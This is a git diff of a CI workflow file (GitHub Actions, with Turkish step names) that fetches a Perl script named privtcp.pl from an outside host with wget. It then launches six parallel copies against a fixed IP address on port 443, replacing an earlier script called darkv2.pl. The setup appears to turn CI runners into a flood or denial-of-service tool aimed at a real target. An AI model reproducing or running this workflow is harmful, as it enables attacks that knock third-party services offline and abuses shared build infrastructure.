@@ -16,14 +16,14 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/seNVq5O1YJ/darkv2.pl
+          wget https://wgetz.com/kS6ENuhaxi/privtcp.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            perl darkv2.pl 204.76.203.30 443 10000 65600 R 1 &
+            perl privtcp.pl 204.76.203.30 443 10000 65600 &
             PIDS+=($!)
           done
           
